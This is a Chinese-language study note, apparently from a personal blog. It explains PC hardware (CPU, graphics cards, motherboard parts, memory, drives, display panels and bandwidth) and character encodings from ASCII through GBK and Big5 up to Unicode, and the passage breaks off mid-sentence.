\n\n**cpu代码含义**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092758.png)\n\n**处理器规格表**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092809.png)\n\n## CPU架构\nCPU架构是CPU厂商给属于同一系列的CPU产品定的一个规范，主要目的是为了区分不同类型CPU的重要标示。目前市面上的CPU分类主要分有两大阵营，一个是intel、AMD为首的复杂指令集CPU，另一个是以IBM、ARM为首的精简指令集CPU。两个不同品牌的CPU，其产品的架构也不相同，例如，Intel、AMD的CPU是X86架构的，而IBM公司的CPU是PowerPC架构，ARM公司是ARM架构。\n\n\n# 显卡\n显卡（Video card、Display card、Graphics card、Video adapter）是个人计算机基础的组成部分之一，将计算机系统需要的显示信息进行转换驱动显示器，并向显示器提供逐行或隔行扫描信号，控制显示器的正确显示，是连接显示器和个人计算机主板的重要组件。市场上主要有nVIDIA和AMD两个厂商\n\n**一般显卡的结构如下**\n- 电容：电容是显卡中非常重要的组成部件，因为显示画质的优劣主要取决于电容的质量，而电容的好坏直接影响到显卡电路的质襞。 [5] \n- **显存**：显存，也被叫做帧缓存，它的作用是用来存储显卡芯片处理过或者即将提取的渲染数据。如同计算机的内存一样，显存是用来存储要处理的图形信息的部件, 主流显存容量一般为2GB ~ 4GB。 [5] \n- **GPU**及风扇：GPU又称显示核心、视觉处理器、显示芯片片，GPU使显卡减少了对CPU的依赖，并进行部分原本CPU的工作, 它负责显卡绝大部分的计算工作，相当干CPU在电脑中的作用。GPU风扇的作用是给GPU散热。 [5] \n- 显卡接口：通常被叫做金手指，可分为PCI、 AGP和PCI Express三种，PCI和AGP显卡接口都基本被淘汰， 市面上主流显卡采用PCI Express的显卡。 [5] \n- 外设接口：显卡外设接口担负着显卡的输出任务，新显卡包括一个传统VGA模拟接口和一个或多个数字接口(DVI、HDMI和DP)。 [5] \n- 桥接接口：中高端显卡可支持多块同时工作，它们之间就是通过桥接器连接桥接口。\n\n## 分类\n### 集成显卡\n集成显卡是将显示芯片、显存及其相关电路都集成在主板上，与其融为一体的元件，会占用一部分系统内存来作为显存\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093218.png)\n\n### 核心显卡\n集成在cpu上的显卡，会占用一部分系统内存来作为显存\n\n### 独立显卡\n独立显卡是指将显示芯片、显存及其相关电路单独做在一块电路板上，自成一体而作为一块独立的板卡存在，它需占用主板的扩展插槽(ISA、 PCI、AGP或PCI-E)。独立显卡的优点是单独安装有显存，一般不占用系统内存，在技术上也较集成显卡先进得多，但性能肯定不差于集成显卡，容易进行显卡的硬件升级\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093228.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093240.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093254.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093307.png)\n\n## GPU\nGPU又称显示核心、视觉处理器、显示芯片片，GPU使显卡减少了对CPU的依赖，并进行部分原本CPU的工作, 它负责显卡绝大部分的计算工作\n\n可以形象的理解为90%的ALU(运算单元)，5%的Control(控制单元)、5%的Cache(缓存单元)\nGPU的设计原理----总结为大量的简单运算\n- 大量的运算单元：负责简单粗暴的计算，不擅长奥数题，但小学题他会\n- 少量的控制单元和缓存单元：主要是负责合并和转发数据，对这两块的需求较小，所以占据GPU较小的空间\n\n## GPU和CPU的特点分别是什么？\n**计算量比较**\n- CPU：计算量小，\n- GPU：计算量大，\n原理：GPU的运算单元数远大于cpu的\n\n**计算复杂度比较：**\n- CPU：可计算复杂的运算，比如积分微分，cpu的运算单元都属于专家级别\n- GPU：只可以计算简单的1+1算术题，不能计算复杂的微分积分，gpu的运算单元属于小学生水平。\n\n**对于单个积分微分的计算速度比较**\n- CPU：较快。原理：单线程计算（比如机器人运动控制），单个芯片性能强劲，计算能力强，能计算出来\n- GPU：较慢，甚至可能计算不了；原理：单个芯片性能弱，计算能力弱，可能算不出来，或速度很慢\n\n**对于多个1+1算术题的计算速度比较**\n- CPU：速度较慢。因为计算原理是：先算第1题， 再算第2题，总时间为【T1+T2+T3>>>+T1000（也就是1000个算术题消耗时间的累加]）】\n- GPU：速度很快。因为计算原理是：可同时计算1000道算术题，总时间为【max（T1,T2,T3...T1000）（也就是1000个算术题消耗时间中的最大值）】\n\n**形象比喻**\n- CPU：像老教授，积分微分都会算，就是工资高，一个老教授资顶二十个小学生，你要是富士康你雇哪个？GPU就是这样，用很多简单的计算单元去完成大量的计算任务，纯粹的人海战术。\n- GPU：计算量大，但没什么技术含量，而且要重复很多很多次。就像你有个工作需要算几亿次一百以内加减乘除一样，最好的办法就是雇上几十个小学生一起算，一人算一部分，反正这些计算也没什么技术含量，纯粹体力活而已。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093319.png)\n\n# 主板\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093329.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093341.png)\n\n## I/O接口\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093353.png)\n\n## CPU插槽\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093406.png)\n\n## 芯片组\n芯片组（英语：Chipset）是一组共同工作的集成电路“芯片”，并作为一个产品销售。它负责将cpu和机器的其它部分相连接，是决定主板级别的重要部件。以往，芯片组由多颗芯片组成，慢慢的简化为两颗芯片。\n在计算机领域，“芯片组”术语通常是特指计算机主板或扩展卡上的芯片。当讨论基于英特尔的奔腾级处理器的个人计算机时，芯片组一词通常指主板上两个主要的芯片：**北桥**和**南桥**。芯片组的制造商可以，通常也是独立于主板的制造商。比如PC主板芯片组包括NVIDIA的nForce芯片组和威盛电子公司的KT880，都是为AMD处理器开发的，或英特尔许多芯片组。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093419.png)\n\n\n## 内存插槽\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093430.png)\n\n## PCI-E插槽\nPCI-E(PCI-Express)是一种通用的总线规格，它由Intel所提倡和推广，其最终的设计目的是为了取代现有电脑系统内部的总线传输接口，这不只包括显示接口，还囊括了CPU、PCI、HDD、Network等多种应用接口。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093440.png)\n\n## sata数据线接口\n用来连接sata固态硬盘、机械硬盘等\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093456.png)\n\n## m.2插槽\n用来连接m.2固态硬盘\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093508.png)\n\n## rgb接口\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093520.png)\n\n## cpu供电部分\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093531.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093547.png)\n\n## 主板电池\n主板电池是用于记录计算机系统的时间，也就是维持系统时钟的准确性，电量不够时，时间会回到出厂日期，还有记录启动时要用的硬件信息，也就是维持CMOS的BIOS信息。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093601.png)\n\n### 主板上为什么有个电池\n<div class='container'>\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/8dS4gomhTaM\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n## 主板供电接口\n给主板供电，电能会通过主板源源不断地提供给主板上的各个设备，例如内存插槽、南桥芯片组、USB接口等\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093648.png)\n\n## 风扇接口\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093702.png)\n\n## 机箱前置面板接口\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093717.png)\n\n## 清空CMOS接帧\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093733.png)\n\n## BIOS\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093745.png)\n\n\n# 存储器相关\n构成存储器的存储介质**主要采用半导体器件和磁性材料**。存储器中最小的存储单位就是一个双稳态半导体电路或一个CMOS晶体管或磁性材料的存储元，它可存储一个二进制代码。由若干个存储元组成一个存储单元，然后再由许多存储单元组成一个存储器。 \n\n根据存储材料的性能及使用方法的不同，存储器有几种不同的分类方法。 \n**1．按存储介质分类**\n- 半导体存储器：用半导体器件组成的存储器。 \n- 磁表面存储器：用磁性材料做成的存储器。 \n**2．按存储方式分类**\n- 随机存储器：任何存储单元的内容都能被随机存取，且存取时间和存储单元的物理位置无关。 \n- 顺序存储器：只能按某种顺序来存取，存取时间与存储单元的物理位置有关。\n**3．按存储器的读写功能分类**\n- 只读存储器(ROM)：存储的内容是固定不变的，只能读出而不能写入的半导体存储器。 注意，广义上的ROM已可通过点擦除等方式进行写入，其“只读”的概念没有保留，但仍然保留了断点内容保留、随机读取特性。\n- 随机读写存储器(RAM)：既能读出又能写入的半导体存储器。 \n**4．按信息的可保存性分类**\n- 非永久记忆的存储器：断电后信息即消失的存储器。 \n- 永久记忆性存储器：断电后仍能保存信息的存储器。  \n**5．按在计算机系统中的作用分类**\n- 主存储器（内存）：用于存放活动的程序和数据，其速度高、容量较小、每位价位高。 \n- 辅助存储器（外存储器）：主要用于存放当前不活跃的程序和数据，其速度慢、容量大、每位价位低。 \n- 缓冲存储器：主要在两个不同工作速度的部件起缓冲作用。 \n\n## 主存储器（内存）\n主存储器由许多**存储单元**组成，每个存储单元包含若干**存储元件**， 每个存储元件存储一位二进制代码。因此存储单元可存储一串二进制代码，称这串代码为**存储字**，称这串代码的位数为**存储字长**。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092820.png)\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092841.png)\n\n**内存频率**\n内存主频和CPU主频一样，用来表示内存的速度，它代表着该内存所能达到的最高工作频率。内存主频是以MHz（兆赫）为单位来计量的。内存主频越高在一定程度上代表着内存所能达到的速度越快，内存主频决定着该内存最高能在什么样的频率正常工作。\n\n**内存时序**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092901.png)\n\n内存时序则是一大串数字，最常用的就有4个，表述的时候中间用破折号隔开，例如16-18-18-38。\n这些数字都表示延迟，也就是内存的反应时间。当内存接收到CPU发来的指令后，通常需要几个时钟周期来处理它，比如访问某一块数据，这就对应时序参数。当然了，这个处理时间越短，内存性能越好\n内存时序4个数字对应的参数分别为CL、tRCD、tRP、tRAS，单位都是时间周期，也就是一个没有单位的纯数字。\n- CL（CAS Latency）：列地址访问的延迟时间，是时序中最重要的参数\n- tRCD（RAS to CAS Delay）：内存行地址传输到列地址的延迟时间\n- tRP（RAS Precharge Time）：内存行地址选通脉冲预充电时间\n- tRAS（RAS Active Time）：行地址激活的时间\n\n**金手指**\n金手指（connecting finger）是电脑硬件如：（内存条上与内存插槽之间、显卡与显卡插槽等），所有的信号都是通过金手指进行传送的。金手指由众多金黄色的导电触片组成，因其表面镀金而且导电触片排列如手指状，所以称为“金手指”。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092920.png)\n\n若金手指接触不良，就极有可能造成电脑不亮机，蓝屏死机等\n\n**防呆口**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092935.png)\n\n**ROM芯片**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092949.png)\n\n**内存双通道**\n内存双通道，就是在北桥（又称之为MCH）芯片级里设计两个内存控制器，这两个内存控制器可相互独立工作，每个控制器控制一个内存通道。在这两个内存通CPU可分别寻址、读取数据，从而使内存的带宽增加一倍，数据存取速度也相应增加一倍（理论上）。\n<font color=\"red\">双通道是一种主板芯片组(Athlon 64集成于CPU中）所采用新技术，与内存本身无关，任何DDR内存都可工作在支持双通道技术的主板上。</font>\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093004.png)\n\n**内存代数**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093038.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093053.png)\n\n**内存规格表**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093105.png)\n\n### 内存细节\n内存这个定义是与外存相对的。外存的定义是用来存放暂时不用或者需要长期保存的东西。而内存的定义则直接与CPU相相连的存储器。能否直接寻址是判断内外存的标准，能就是内存；不能，就是外存。\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/S66Q3h6cEtw\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n## 硬盘\n如果从存储数据的介质上来区分，硬盘可分为机械硬盘（Hard Disk Drive, HDD）和固态硬盘（Solid State Drive, SSD），机械硬盘采用磁性碟片来存储数据，而固态硬盘通过闪存颗粒来存储数据。\n### 机械硬盘\n我们先来看看最常见的机械硬盘。机械硬盘的外观大家可能都见过，那么机械硬盘拆开后是什么样子的呢？如图 1 所示。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093117.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093129.png)\n\n每个扇区的存储大小是一样的\n\n**存储原理**\n硬盘储存数据的原理和盒式磁带类似，只不过盒式磁带上存储是模拟格式的音乐，而硬盘上存储的是数字格式的数据。写入时，磁头线圈上加电，在周围产生磁场，磁化其下的磁性材料；电流的方向不同，所以磁场的方向也不同，可以表示 0 和 1 的区别。\n读取时，磁头线圈切割磁场线产生感应电流，磁性材料的磁场方向不同，所以产生的感应电流方向也不同。\n\n### 固态硬盘\n固态硬盘和传统的机械硬盘最大的区别就是不再采用盘片进行数据存储，而采用存储芯片进行数据存储。固态硬盘的存储芯片主要分为两种：一种是采用闪存作为存储介质的；另一种是采用DRAM作为存储介质的。目前使用较多的主要是采用闪存作为存储介质的固态硬盘，如图 8 所示。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093143.png)\n\n**固态硬盘和机械硬盘对比**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093155.png)\n\n**硬盘规格图**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093204.png)\n\n# 显示器相关\n## 屏幕上显示文字原理\n### 显卡和显存\n为了显示文字，通常需要两种硬件，一是显示器，二是显卡\n- 显卡的职责是为显示器提供内容，并控制显示器的显示模式和状态\n- 显示器的职责是将那些内容以视觉可见的方式呈现在屏幕上\n\n显卡控制显示器的最小单位是像素，一个像素对应着屏幕上的一个点。屏幕上通常有数十万乃至更多的像素，通过控制每个像素的明暗和颜色，我们就能让这大量的像素形成文字和美丽的图像。\n不过，一个很容易想到的问题是，如何来控制这些像素呢？\n答案是显卡都有自己的存储器，因为它位于显卡上，故称显示存储器（ Video RAM：VRAM），简称显存，要显示的内容都预先写入显存。和其他半导体存储器一样，显存并没有什么特殊的地方，也是一个按字节访问的存储器件。\n\n对显示器来说，显示黑白图像是最简单的，因为只需要控制每个像素是亮，还是不亮。如果把不亮当成比特“0”，亮看成比特“1”，那就好办了。因为，只要将显存里的每个比特和显示器上的每个像素对应起来，就能实现这个目标。\n如下图所示，显存的第 1 个字节对应着屏幕左上角连续的 8 个像素；第 2 个字节对应着屏幕上后续的 8 个像素， 后面的依次类推。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093759.png)\n\n显卡的工作是周期性地从显存中提取这些比特，并把它们按顺序显示在屏幕上。如果是比特“0”，则像素保持原来的状态不变，因为屏幕本来就是黑的；如果是比特“ 1”，则点亮对应的像素。\n不管是显示图片，还是文字，对显示器来说没有什么不同，因为所有的内容都是由像素组成的，区别仅仅在于这些像素组成的是什么。有时候，人们会说，哦，显示的是一棵树；有时候，人们会说，哦，显示的是一个字母“H”。\n\n问题是，操作显存里的比特，使得屏幕上能显示出字符的形状，是非常麻烦、非常繁重的工作，因为你必须计算该字符所对应的比特位于显存里的什么位置。\n为了方便，工程师们想出了一个办法。就像一个二进制数既可以是一个普通的数，也可以代表一条处理器指令一样，他们认为每个字符也可以表示成一个数。比如，数字 0x4C 就代表字符“L”，这个数被称为是字符“ L”的 ASCII 代码，后面会讲到。\n\n如下图所示，可以将字符的代码存放到显存里，第 1 个代码对应着屏幕左上角第 1 个字符，第 2 个代码对应着屏幕左上角第 2 个字符，后面的依次类推。剩下的工作是如何用代码来控制屏幕上的像素，使它们或明或暗以构成字符的轮廓，这是字符发生器和控制电路的事情。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093811.png)\n\n传统上，这种专门用于显示字符的工作方式称为文本模式。文本模式和图形模式是显卡的两种基本工作模式，可以用指令访问显卡，设置它的显示模式。在不同的工作模式下，显卡对显存内容的解释是不同的。\n\n## 屏幕面板\n按照屏幕显示技术可以分为三类：CRT阴极射线显像管技术、LCD液晶显像技术、OLED有机发光半导体技术\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094315.png)\n\n- CRT（Cathode Ray Tube）是阴极射线管\n- LCD 英文全称 Liquid Crystal Display ，中文翻译为液晶显示器。\n- LED 英文全称Light Emitting Diode，中文名发光二极管\n- QLED 英文全称是“Quantum Dots Light Emitting Diode Display”即量子点发光二极管显示器\n\n### CRT阴极射线显像管技术\n很久以前大屁股电视和显示器都是CRT的技术\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094326.png)\n\n### LCD\nLCD是一种被动发光技术，需要背光模组发光，通过滤光片，然后才能表达为红蓝绿色。精准的控制红蓝绿子像素就能够显示我们想要的任何颜色。\n\nLCD的优点如下：\n- 对比OLED，技术更加成熟成本低\n- 无极材料寿命更长\n- 对比OLED，同分辨率下文字清晰度更高\n- DC无屏闪也对眼睛更加友好\n\nLCD的缺点如下：\n- 由于背光模组的存在，导致屏幕会有漏光问题，显示黑色的时候也不是完全的黑，更接近灰色，所以对比度明显比OLED低\n\n#### QLED\nQLED其实就是背光技术不同的LCD面板\n\n#### TN、VA、IPS\n由于液晶分子排列的不同，LCD还可以分为TN、VA、IPS\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094339.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094349.png)\n\n##### TN\nTN是最老的液晶驱动方式，由于低廉的生产成本使TN成为早期显示器的选择，直到VA、IPS液晶成熟才逐渐被淘汰掉。\n\nTN优点：\n- 最低可以实现1ms灰阶响应延迟，加上144Hz刷新率特别适合射击游戏\n\nTN缺点：\n- 色彩比较差，色彩最暗\n- 颜色泛白不通透\n- 可视角度差，一些劣质TN屏还能起到防偷窥的效果\n\n##### VA\nVA(Vertical Alignment)是垂直排列面板，比TN面板有更高的对比度和更宽广的可视角度\n\nTA优点：\n- 色彩表现较为艳丽，黑色比较纯粹，对比度高\n- 可以实现曲面屏幕\n\nTA缺点：\n- 延迟比较高\n- 拖延比较明显\n- 不适合需要高刷新率的游戏\n\n##### IPS\nIPS(In-Plane Switching)是平面转换面板，是目前最主流的液晶面板，也是最优秀的LCD面板\n\nIPS优点：\n- 色彩鲜艳，色彩还原真实\n- 3ms灰阶响应延迟\n\nIPS缺点：\n- LCD通病，轻微漏光\n\n### OLED\nOLED优点：\n- OLED的特性是白发光不需要背光，像素能够自己产生红蓝绿色，因此对比LCD，可视角度和亮度、对比度都更好一些，色彩更鲜艳，黑色是完全的黑色，更省电，延迟更低\n\nOLED缺点：\n- 由于采用有机材料，导致寿命短容易烧屏的问题\n- 使用PWM调光会有频闪问题刺激眼睛\n\n### Mini-LED\n小型LED背光技术，将传统的大灯珠调整为更多的小灯珠，实现了类似OLED显示器的对比度和亮度，也同时拥有了LCD的长寿命，但这种屏幕会有光晕问题，成本和功耗也比较高。\n\n### Micro-LED\n以自发光的微米级的LED为发光像素单元。在显示方面与LCD、OLED相比在亮度、分辨率、对比度、能耗、使用寿命、响应速度和热稳定性等方面具有更大的优势。由于Micor-LED成本及其夸张，现有的技术下，绝无大面积推广Micro-LED的可能性\n\n## 显示器接口带宽含义\n显示器接口带宽与分辨率、刷新率之间的关系。以dp1.4为例，单口DP 1.4的实际可用带宽为 4通道\\*8.1Gbit/s = 32.4Gbit/s\n\n若不进行色彩压缩以及不考虑传输损耗的情况下，几种传输峰值如下：\n- 4K@144，8Bit RGB： `3840*2160*8*3*144Hz= 26.7Gbit/s`\n- 4K@120，10Bit RGB： `3840*2160*10*3*120Hz= 27.8Gbit/s`\n- 4K@144，10Bit RGB： `3840*2160*10*3*144Hz= 33.4Gbit/s` （DP1.4已经不能满足）\n- 4K@165，8Bit RGB： `3840*2160*8*3*165Hz=30.6Gbit/s`\n\n> 每个计算中都有的 3 代表RGB三原色\n\n## 显示设备亮度\n对显示设备而言，亮度是一个十分关键的性能衡量指标。而亮度又是以坎德拉每平方米（cd/m2）或尼特（nit）来衡量。就像汽车发动机的功率是用“马力”表示一样，尼特也是如此。其代表的意义是一台显示器的亮度相当于多少支蜡烛(candle)的亮度。300尼特桌面显示器的光量相当于300支蜡烛在1平方米空间的亮度。1500尼特户外显示屏则相当于1500支蜡烛的照度。注意显示设备中nits衡量的是一块屏幕最高的亮度峰值，而不是恒定的\n\n## HDR\nHDR的英文是High Dynamic Range，即高动态范围，摄影领域的HDR和显示领域的HDR概念不太一样，此处讲的是显示领域的HDR。HDR你可以理解为画面中最亮的元素用最高亮度来显示，低亮度的元素依然能够维持比较低的亮度。在目前主流的LCD显示面板是非常难实现的，应为背光板是一整块，输出是恒定的。画面中比较暗的元素是通过偏振膜过滤光线显示出来的。但是当背光亮度很高的时候，暗光的显示就不那么存粹了。目前LCD面板从原理上来讲，基本上是满足不了HDR的需求的。就算有些厂商声称他们的LCD面板支持HDR，效果也一定比较差。主流支持HDR显示的面板一般都是自发光的OLED显示面板和量子点QLED面板\n\n## 帧率与刷新率\n帧率（Frame rate）是以帧称为单位的位图图像连续出现在显示器上的频率（速率）。该术语同样适用于胶片和摄像机，计算机图形和动作捕捉系统。帧速率也可以称为帧频率，并以赫兹（Hz）表示。\n刷新率是指电子束对屏幕上的图像重复扫描的次数，你可以这么理解，刷新率就是屏幕每秒画面被刷新的次数。刷新率越高，所显示的图象（画面）稳定性就越好。\n\n帧率取决于显卡\n刷新率取决于显示器。\n\n假如帧率为200帧，但是由于显示器刷新率只有30Hz，只能“抓取”其中的30帧进行显示，最终你所看到的画面还是30帧。\n\n# 编码与解码\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093822.png)\n\n\n## 什么是编码与解码\n- 编码：从文字到0、1的映射\n- 解码：从0、1到文字映射\n\n## 字符、字符集与字符编码之间的关系\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093835.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093846.png)\n\n字符集(编码表)：字符 <--> 码位\n字符编码：码位 <--> 用于存储的二进制数据\n\n- 字符（Character）就是各种文字和符号的总称，包括各国家文字、标点符号、图形符号、数字等。\n- 字符集(Character set）就是多个字符的集合，<font color='red'>且为每个字符分配了一个唯一的ID(学名为码位/码点)</font>，字符集种类较多，每个字符集包含的字符个数不同。\n- 字符编码（Character encoding）也称字集码，就是把字符集中的字符所对应的码位，编码为特定的二进制数据。\n\n- 常见字符集名称：ASCII、IOS-8859-1、windows-1252、GB2312、GBK、GB18030、Big5、、Unicode等。\n- 每种字符集都有对应的字符编码方法\n- 常见的字符编码：ASCII、IOS-8859-1、windows-1252、GB2312、GBK、GB18030、Big5、、Unicode、UTF-8、UTF-16、UTF-32等。\n\n由于对于不同的字符集中，同一个字符的码位可能不一样，但又要考虑到不同字符集之间相兼容等问题，所以不能一概将码位直接转换位其二进制数据进行存储(如：12直接转换为二进制1100), 所以要为每一套字符集设计其对对应的编码规则，来将码位转换位特定的二进制数据\n例如：\n- ASCII字符集中的A字符对应的码位位65，通过ASCII编码后，码位对应的二进制数据为01000001，ASCII编码采用的方式是直接将码位转换位二进制数据\n- gb2312字符集中的“侃”对应的码位为5709， 通过gb2312编码后，码位对应的二进制数据位0xD90xA9, 可以看出gb2312编码采用的方式不是直接将码位转换位二进制数据\n\n\t\n## 常见的字符集\n### ASCII\n世界上虽然有各种各样的字符，但计算机发明之初没有考虑那么多，基本上只考虑了美国的需求，美国大概只需要128个字符，美国就规定了这128个字符的二进制表示方法，这个方法是一个标准，称为ASCII编码，全称是American Standard Code for Information Interchange，美国信息互换标准代码。128个字符用7个位刚好可以表示，计算机存储的最小单位是byte,即8位，ASCII码中最高位设置为0，用剩下的7位表示字符。这7位可以看做数字0到127，ASCII码规定了从0到127个，每个数字代表什么含义。我们先来看数字32到126的含义，如下图所示，除了中文之外，我们平常用的字符基本都涵盖了，键盘上的字符大部分也都涵盖了。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093859.png)\n\n数宇32到126表示的这些字符都是可打印字符，0到31和127表示一些不可以打印的字符，这些字符一般用于控制目的，这些字符中大部分都是不常用的\n\nAsCII码对美国是够用了，但对别的国家而言却是不够的，于是，各个国家的各种计算机厂商就发明了各种各样的编码方式以表示自己国家的字符，为了保持与ASCII码的兼容性，一般都是将最高位设置为1。也就是说，当最高位为0时，表示ASCII码，当为1时就是各个国家自己的字符。在这些扩展的编码中，在西欧国家中流行的是ISO 8859-1和Windows-1252，在中国是GB2312， GBK，SB18030和Big5， 我们逐个来研究这些编码。\n\n### ISO-8859-1\nISO-8859-1又称Latin-1，它也是使用一个字节表示一个字符，因为西欧的文字也都是字母拼接，只不过不是26个\n英文字母罢了，其中0到127与AscII一样，128到255规定了不同的含义。在128到255中，128到159表示-些控制宇符，这些字符也不常用，就不介绍了。160到255表示一些西欧字符，如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093912.png)\n\n### widows-1252\nISO-8859-1虽然号称是标准，用于西欧国家，但它连欧元(€)这个符号都没有，因为欧元比较晚，而标准比较早，实际使用中更为广泛的是Windows-1252编码，这个编码与1SO-8859-1基本是一样的，区别只在于数字128到159, Windows-1252使用其中的一些数字表示可打印字符，这些数字表示的含义，如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093924.png)\n\n这个编码中加入了欧元符号以及一些其他常用的字符。基本上可以认为，ISO-8859-1已被Windows-1252取代，在很多应用程序中，即使文件声明它采用的是ISO-8859-1编码，解析的时候依然被当做Windows-1252编码。\n\nHTML5甚至明确规定，如果文件声明的是ISO-8859-1编码，它应该被看做Windows-1252编码。为什么要这样呢？因为大部分人搞不清楚ISO-8859-1和Windows-1252的区别，当他说ISO-8859-1的时候，其实他实际指的是Windows-1252，所以标准干脆就这么强制了。\n\n### GB2312\n美国和西欧字符用一个字节就够了，但中文显然是不够的。中文第一个标准是GB2312。 GB2312标准主要针对的是简体中文常见字符，包括约7000个汉宇，不包括一些罕见词，不包括繁体字。GB2312固定使用两个字节表示汉宇，在这两个字节中，最高位都是1，如果是0，就认为是AscII字符。在这两个字节中，其中第\n一个字节范围是1010 0001（十进制161)-11110111（十进制247)，第二个字节范围是10100001（十进制161）-11111110（十进制254)。\n\n### GBK\nGBK建立在GB2312的基础上，向下兼容GB2312，也就是说，GB2312编码的字符的二进制表示，在GBK编码里是完全一样的。GBK增加了一万四千多个汉字，共计约21000汉字，其中包括繁体字。GBK同样使用固定的两个字节表示，其中第一个字节范国是1000 0001（十进制129）- 11111110（十进制254），第二个字节范围是0100\n0000（十进制64)-01111110（十进制126)和10000000（十进制128)-11111110（十进制254)。 需要注意的是，第二个字节是从64开始的（64属于byte正数范国，和ASCI的编码重合了），也就是说，第二个字节最高位可能为0。那怎么知道它是汉字的一部分，还是一个ASCII字符呢？\n其实很简单，因为汉字是用固定两个字节表示的，在解析二进制流的时候，如果第一个字节的最高位为1，那么就将下一个字节读进来一起解析为个汉宇，而不用考虑已的最高位，解析完后，跳到第三个字节继续解析。\n\n\n### GB18030\nGB18030向下兼容GBK，增加了五万五干多个字符，共七万六干多个字符。包括了很多少数民族字符，以及中日韩统一字符。用两个字节已经表示不了GB18030中的所有字符，GB18030使用变长编码，有的字符是两个字节,有的是四个字节。在两字节编码中，字节表示范国与GBK一样。在四字节编码中，第一个字节的值从1000\n0001（十进制129)到11111110（十进制254)，第二个字节的值从0011 0000（十进制48)到00111001（十进制57），第三个字节的值从1000 0001(十进制129)到11111110(十进制254），第四个字节的值从0011 0000(十进制48)到00111001（十进制57）。\n解析二进制时，如何知道是两个字节还是四个字节表示一个字符呢？很简单，看第二个字节的范围，如果是48到57就是四个字节表示，因为两个字节编码中第二字节都比这个大。所以这样综合说明GB18030兼容GBK，兼容GB2312，兼容ASCII，但是GB18030，GBK, GB2312这三个编码和ISO-8859-1是不兼容的哦。\n\n### Big5\nBig5是针对繁体中文的，广泛用于台湾香港等地。Big5包括1万3千多个繁体字，和GB2312类似，一个字符同样固定使用两个字节表示。在这两个字节中，第一个字节范围是10000001（十进制129)到11111110（十进制254)，第二个字节范围是01000000（十进制64)-01111110（十进制126）和10100001（十进制161） -11111110（十进制254)。Big5和GB18030， GBK, GB2312不兼容哈，如果已经理解了上文，其实你就能理解为什么Big5和GB三个编码为什么不兼容了。\n\n### unicode\n世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。\n可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是 Unicode，就像它的名字都表示的，这是一种所有符号的编码。\nUnicode 当然是一个很大的集合，现在的规模可以容纳100多万个符号。每个符号的编码都不一样，比如，U+0639表示阿拉伯字母Ain，U+0041表示英语的大写字母A，U+4E25表示汉字严\n\n需要注意的是，Unicode 